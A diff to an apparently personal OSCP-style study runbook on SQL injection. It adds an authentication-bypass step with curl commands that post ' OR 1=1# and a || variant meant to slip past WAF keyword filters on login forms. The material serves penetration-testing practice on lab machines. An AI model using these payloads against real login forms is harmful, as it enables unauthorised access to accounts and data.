@@ -1,11 +1,20 @@
 ---
 tags: [oscp, web-app, sqli, runbook]
-box_sources: [Pebbles]
+box_sources: [Pebbles, Cockpit]
 ---
 
 # Web App — SQLi
 
 *Suspected SQL injection. Confirm it, characterise it, then exploit it.*
+
+---
+
+## Step 0 — Auth Bypass
+
+| Command | Evidence | Works when | Notes | ✅ Go to | ❌ If nothing works |
+|---|---|---|---|---|---|
+| `curl -s -X POST "$URL" --data-urlencode "username=' OR 1=1#" -d "password=x" -L` | Login succeeds / different page returned | Login form with no CSRF token, MySQL backend | Classic tautology. `--data-urlencode` handles URL encoding of `'` and `#` automatically. | Post-auth enumeration | WAF blocks → try `\|\|` bypass below |
+| `curl -s -X POST "$URL" --data-urlencode "username=' \|\| 1=1#" -d "password=x" -L` | Login succeeds | WAF blocking `OR` keyword | `\|\|` is MySQL boolean OR — functionally identical but bypasses keyword filters. Confirmed on Cockpit (PG). | Post-auth enumeration | [[Web App - SQLi]] (deeper injection) |
 
 ---
 
